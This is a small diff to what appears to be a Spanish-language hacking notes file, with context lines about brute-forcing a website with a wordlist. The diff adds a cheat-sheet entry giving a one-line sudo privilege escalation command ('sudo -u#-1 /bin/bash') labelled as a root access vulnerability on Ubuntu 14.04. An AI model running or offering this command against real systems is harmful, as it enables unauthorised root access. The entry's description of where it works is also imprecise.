@@ -835,6 +835,11 @@ second-app:
 --- El programa probará todas las cadenas del worldlist en contra del sitio web
 
 
+++ Root access vulnerability (Ubuntu 14.04)
+--- sudo -u#-1 /bin/bash 
+
+
+
 
 
 
